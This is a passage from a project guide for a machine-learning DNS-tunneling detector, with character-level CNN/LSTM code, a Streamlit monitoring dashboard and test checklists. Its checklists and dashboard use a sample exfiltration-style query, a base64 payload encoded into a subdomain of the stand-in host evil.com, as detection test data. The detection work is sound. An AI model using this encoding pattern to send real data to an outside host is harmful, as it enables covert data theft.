- [ ] Markdown cell written explaining: "Why does the autoencoder fail to reconstruct tunneled queries even though it never saw them during training?" — write the answer in your own words

---

---

## M-7 — Phase 3 ML: Character-Level CNN & LSTM

**Time:** 3 days | **Tag:** PHASE 3 ML
**Notebook:** `models/phase3_lstm_cnn.ipynb`

### Background

All previous models worked from engineered features — numbers you computed from
the query string (entropy, length, etc.). This milestone takes a different
approach: feed the raw character sequence of the domain name directly into a
neural network and let it learn its own features.

This is the same philosophy as NLP. A domain name like `google.com` is treated
as a sequence of characters, exactly like a sentence is a sequence of words.
A convolutional network learns local patterns (runs of base64 characters,
unusual trigrams). An LSTM reads the sequence left to right, building a
memory of what it has seen so far.

This approach is how production DGA detectors work at Cisco Umbrella, Palo Alto
Cortex, and similar platforms. If your LSTM matches or beats your Random Forest,
that tells you the raw character sequence contains signal that your hand-engineered
features failed to fully capture.

### What to Build

**Character Tokenisation**

```python
import numpy as np
from tensorflow import keras
from tensorflow.keras import layers

# Character vocabulary: DNS names use these characters
VOCAB = list('abcdefghijklmnopqrstuvwxyz0123456789-.')
char_to_idx = {c: i+1 for i, c in enumerate(VOCAB)}  # 0 reserved for padding
MAX_LEN = 100

def tokenise(query: str) -> list:
    # Use only the subdomain (leftmost label) — the part that carries payload
    subdomain = query.split('.')[0].lower()
    return [char_to_idx.get(c, 0) for c in subdomain[:MAX_LEN]]

# Apply to your full query list
query_names = df['query_name'].tolist()
y_seq = df['label'].values

X_seq = keras.preprocessing.sequence.pad_sequences(
    [tokenise(q) for q in query_names],
    maxlen=MAX_LEN,
    padding='post',
    value=0
)

# Same 80/20 stratified split
from sklearn.model_selection import train_test_split
X_seq_train, X_seq_test, y_seq_train, y_seq_test = train_test_split(
    X_seq, y_seq, test_size=0.2, stratify=y_seq, random_state=42
)
```

**1D CNN Model**

The convolution slides a filter window of width 3 over the character sequence,
learning which character trigrams are predictive. Base64 has very characteristic
trigram patterns that differ from English words.

```python
cnn_model = keras.Sequential([
    layers.Embedding(len(VOCAB)+1, 8, input_length=MAX_LEN),
    layers.Conv1D(64, kernel_size=3, activation='relu', padding='same'),
    layers.MaxPooling1D(pool_size=2),
    layers.Conv1D(128, kernel_size=3, activation='relu', padding='same'),
    layers.GlobalMaxPooling1D(),
    layers.Dense(64, activation='relu'),
    layers.Dropout(0.3),
    layers.Dense(1, activation='sigmoid')
], name='char_cnn')

cnn_model.compile(optimizer='adam', loss='binary_crossentropy', metrics=['accuracy'])
cnn_model.summary()

cnn_history = cnn_model.fit(
    X_seq_train, y_seq_train,
    epochs=30,
    batch_size=128,
    validation_split=0.1,
    callbacks=[keras.callbacks.EarlyStopping(patience=3, restore_best_weights=True)]
)
```

**LSTM Model**

The LSTM maintains a hidden state as it reads character by character. Unlike
CNN, it captures long-range dependencies — the pattern of characters near the
end of a 90-character encoded string depends on what came before it.

```python
lstm_model = keras.Sequential([
    layers.Embedding(len(VOCAB)+1, 16, input_length=MAX_LEN),
    layers.LSTM(64, return_sequences=True),
    layers.LSTM(32),
    layers.Dense(32, activation='relu'),
    layers.Dropout(0.3),
    layers.Dense(1, activation='sigmoid')
], name='char_lstm')

lstm_model.compile(optimizer='adam', loss='binary_crossentropy', metrics=['accuracy'])

lstm_history = lstm_model.fit(
    X_seq_train, y_seq_train,
    epochs=30,
    batch_size=64,
    validation_split=0.1,
    callbacks=[keras.callbacks.EarlyStopping(patience=3, restore_best_weights=True)]
)
```

**Evaluation + Final Comparison Table**

```python
from sklearn.metrics import classification_report

cnn_pred = (cnn_model.predict(X_seq_test) > 0.5).astype(int)
lstm_pred = (lstm_model.predict(X_seq_test) > 0.5).astype(int)

print('=== 1D CNN ===')
print(classification_report(y_seq_test, cnn_pred, target_names=['normal','tunneled']))
print('=== LSTM ===')
print(classification_report(y_seq_test, lstm_pred, target_names=['normal','tunneled']))
```

Build the final comparison table in a markdown cell — this is the headline
result of the entire project:

| Model            | Type                   | Precision | Recall | F1  | Notes                    |
|------------------|------------------------|-----------|--------|-----|--------------------------|
| Random Forest    | Supervised             | TBD       | TBD    | TBD | Engineered features      |
| Isolation Forest | Unsupervised           | TBD       | TBD    | TBD | No attack labels needed  |
| Autoencoder      | Deep Anomaly Detection | TBD       | TBD    | TBD | Reconstruction error     |
| 1D CNN           | Sequence (char-level)  | TBD       | TBD    | TBD | Local char n-gram patterns |
| LSTM             | Sequence (char-level)  | TBD       | TBD    | TBD | Long-range char sequence |

Below the table, write a genuine conclusion paragraph (minimum 150 words):
- Did character-level models outperform engineered features?
- What does this tell you about the nature of the signal in DNS tunnel traffic?
- Where would you deploy each model in a real system? (Random Forest for
  explainability, LSTM for raw detection power, Autoencoder for zero-day
  detection without labels)

Save both models:
```python
cnn_model.save('models/cnn_model.keras')
lstm_model.save('models/lstm_model.keras')
```

**Git Commit:** `M-7: Phase 3 ML — character-level CNN and LSTM, final model comparison`

### ✅ Test Checklist

- [ ] `tokenise('SGVsbG8gV29ybGQ.evil.com')` returns a list of integers, length ≤ 100
- [ ] `tokenise('mail.google.com')` returns a list of integers, length ≤ 100
- [ ] Both models train without errors and EarlyStopping fires before epoch 30
- [ ] CNN training loss curve saved and converged
- [ ] LSTM training loss curve saved and converged
- [ ] Classification report printed for both CNN and LSTM
- [ ] Final 5-model comparison table complete with actual numbers (no TBDs)
- [ ] Conclusion paragraph written — minimum 150 words, genuine analysis
- [ ] `models/cnn_model.keras` and `models/lstm_model.keras` saved and reloadable

---

---

## M-8 — Streamlit Dashboard, Screencast & Final Polish

**Time:** 2 days | **Tag:** FINAL

### What to Build

**Streamlit Dashboard (`dashboard/app.py`)**

```python
import streamlit as st
import sqlite3
import pandas as pd
import numpy as np
import joblib
import time
from tensorflow import keras
from pipeline.features import build_feature_vector

# Load models once at startup
@st.cache_resource
def load_models():
    rf = joblib.load('models/rf_model.pkl')
    scaler = joblib.load('models/scaler.pkl')
    autoencoder = keras.models.load_model('models/autoencoder.keras')
    return rf, scaler, autoencoder

rf, scaler, autoencoder = load_models()

st.title('DNS Exfiltration Detection System')
st.caption('Real-time DNS query monitoring with ML anomaly detection')

tab1, tab2, tab3 = st.tabs(['Live Feed', 'Model Results', 'Query Inspector'])
```

**Tab 1 — Live Feed**

Poll `data/scored.db` every 5 seconds. Show a table with the 50 most recent
queries. Colour rows: `shannon_entropy > 4.5` → red background, `> 3.5` →
orange, else green. Show columns: timestamp, query_name, shannon_entropy,
subdomain_length, RF prediction score.

```python
with tab1:
    st.subheader('Recent Queries')
    placeholder = st.empty()

    while True:
        conn = sqlite3.connect('data/scored.db')
        df = pd.read_sql(
            'SELECT * FROM scored_queries ORDER BY id DESC LIMIT 50',
            conn
        )
        conn.close()

        def colour_row(row):
            if row['shannon_entropy'] > 4.5:
                return ['background-color: #ff4444; color: white'] * len(row)
            elif row['shannon_entropy'] > 3.5:
                return ['background-color: #ff8800; color: white'] * len(row)
            return [''] * len(row)

        styled = df.style.apply(colour_row, axis=1)
        placeholder.dataframe(styled, use_container_width=True)
        time.sleep(5)
        st.rerun()
```

**Tab 2 — Model Results**

Load and display your saved PNG files from the `demo/` folder:

```python
with tab2:
    st.subheader('Model Performance')
    col1, col2 = st.columns(2)
    with col1:
        st.image('demo/rf_confusion_matrix.png', caption='Random Forest Confusion Matrix')
        st.image('demo/autoencoder_reconstruction_error.png', caption='Autoencoder Error Distribution')
    with col2:
        st.image('demo/roc_curve.png', caption='ROC Curves')
        st.image('demo/shap_plots/shap_summary.png', caption='SHAP Feature Importance')

    st.subheader('Final Model Comparison')
    results = {
        'Model': ['Random Forest','Isolation Forest','Autoencoder','1D CNN','LSTM'],
        'Type': ['Supervised','Unsupervised','Deep Anomaly','Sequence','Sequence'],
        'Precision': [0.0, 0.0, 0.0, 0.0, 0.0],  # fill with your real numbers
        'Recall':    [0.0, 0.0, 0.0, 0.0, 0.0],
        'F1':        [0.0, 0.0, 0.0, 0.0, 0.0],
    }
    st.dataframe(pd.DataFrame(results), use_container_width=True)
```

**Tab 3 — Query Inspector**

```python
with tab3:
    st.subheader('Inspect Any Domain')
    query_input = st.text_input('Enter a domain name:', 'SGVsbG8gV29ybGQ.evil.com')

    if st.button('Analyse'):
        features = build_feature_vector(query_input)
        st.json(features)

        feature_array = np.array([[
            features['subdomain_length'],
            features['full_query_length'],
            features['shannon_entropy'],
            features['digit_ratio'],
            features['consonant_vowel_ratio'],
            features['label_count'],
            features['max_label_length'],
            features['has_hex_pattern'],
        ]])

        scaled = scaler.transform(feature_array)
        rf_score = rf.predict_proba(scaled)[0][1]
        ae_error = float(np.mean(np.power(scaled - autoencoder.predict(scaled), 2)))

        col1, col2 = st.columns(2)
        with col1:
            st.metric('Random Forest Score', f'{rf_score:.3f}',
                      delta='TUNNELED' if rf_score > 0.5 else 'NORMAL')
        with col2:
            st.metric('Autoencoder Error', f'{ae_error:.6f}',
                      delta='ANOMALOUS' if ae_error > 0.01 else 'NORMAL')

        if rf_score > 0.5 or ae_error > 0.01:
            st.error('⚠️ This query exhibits DNS tunneling characteristics')
        else:
            st.success('✅ This query appears normal')
```

Run with: `streamlit run dashboard/app.py`

**README Final State**

The README must contain these sections in this order:

1. Project title + one-line description
2. **Demo video link — at the very top, bold, before everything else**
3. Architecture diagram (the ASCII pipeline from the project doc)
4. Quick Start: `pip install -r requirements.txt`, how to run DNS server,
   how to run scorer, how to run dashboard
5. Dataset download instructions
6. Model results table with real numbers filled in
7. `## Security Context` — explain what DNS tunneling is and why detection matters
8. Repository structure

**requirements.txt**

Run `pip freeze > requirements.txt` in your virtual environment after all
packages are installed. Test a clean install: create a fresh venv, run
`pip install -r requirements.txt`, confirm everything imports without errors.

**Screencast**

Target 4–6 minutes. Use OBS Studio or Loom. Record at 1080p. Follow this
structure:

- 0:00–1:00 — DNS server running + dig command resolving a real domain
- 1:00–1:45 — Run tunnel_sim.py, show encoded queries scrolling through the log
- 1:45–3:15 — Live dashboard: colour-coded query feed, show flagged rows
- 3:15–4:15 — Model results tab: comparison table + one SHAP plot explained
- 4:15–4:45 — Query Inspector: type a base64-looking domain, show scores
- 4:45–5:00 — GitHub repo overview

Upload to YouTube (Unlisted) or Google Drive (Anyone with link). Embed the
link in the README above all other content.

**Git Commit:** `M-8: Streamlit dashboard, demo video embedded, README finalised — project complete`

### ✅ Test Checklist

- [ ] `streamlit run dashboard/app.py` opens in browser without errors
- [ ] Tab 1 live feed updates when new queries arrive in `scored.db`
- [ ] Colour coding works: base64-looking queries show in red, normal ones in green
- [ ] Tab 2 displays all saved PNG plots without broken image errors
- [ ] Tab 3 analyses any entered domain and returns RF + Autoencoder scores
- [ ] Entering `SGVsbG8gV29ybGQ.evil.com` triggers the red anomaly warning
- [ ] Entering `mail.google.com` shows green normal status
- [ ] `pip install -r requirements.txt` in a fresh venv installs without errors
- [ ] README has demo video link as the first content element
- [ ] README results table has real numbers — no TBDs remaining
- [ ] `git log --oneline` shows clean commit history: M-0 through M-8 in order

---

---

## Git Commit Reference

| Milestone | Exact Commit Message                                                              |
|-----------|-----------------------------------------------------------------------------------|
| M-0       | `M-0: Initial repository setup, folder structure, and README`                     |
| M-1       | `M-1: DNS server core — UDP socket, header and question section parsing`           |
| M-2       | `M-2: DNS compression, query forwarder, and SQLite logger`                        |
| M-3       | `M-3: Data pipeline — dataset EDA, feature engineering, preprocessing`            |
| M-4       | `M-4: Live scorer, synthetic tunneling simulation, attack data generation`        |
| M-5       | `M-5: Phase 1 ML — Random Forest, Isolation Forest, SHAP explainability`          |
| M-6       | `M-6: Phase 2 ML — Autoencoder anomaly detection and threshold tuning`            |
| M-7       | `M-7: Phase 3 ML — character-level CNN and LSTM, final model comparison`          |
| M-8       | `M-8: Streamlit dashboard, demo video embedded, README finalised — project complete` |
| AG-1      | `AG-1: Docker containerisation — Dockerfile and docker-compose for full stack`    |
| AG-2      | `AG-2: Transformer fine-tuning — CharBERT for DNS threat classification`          |
| AG-3      | `AG-3: Threat intelligence integration — CISA KEV and OTX feed correlation`       |
| AG-4      | `AG-4: DGA detection extension — multi-class LSTM across malware families`        |

---

## What You No Longer Need CodeCrafters For

The DNS server stages map exactly to RFC 1035 as follows:

| CodeCrafters Stage      | RFC 1035 Section | Covered In |
|-------------------------|------------------|------------|
| Setup UDP server        | 4.2.1            | M-1 Day 1  |
| Write header section    | 4.1.1            | M-1 Day 1  |
| Write question section  | 4.1.2            | M-1 Day 2  |
| Write answer section    | 4.1.3            | M-1 Day 2  |
| Parse header section    | 4.1.1            | M-1 Day 1  |
| Parse question section  | 4.1.2            | M-1 Day 2  |
| Parse compressed packet | 4.1.4            | M-2        |
| Forwarding server       | (design pattern) | M-2        |

You have not lost anything by losing the platform. You gained
independence from their test harness and full ownership of your
validation criteria — which is better, because your checklist
tests things that actually matter for a security project.

---

*Milestone document generated May 2026 · Stack: Python · RFC 1035 · scikit-learn · Keras · Streamlit*
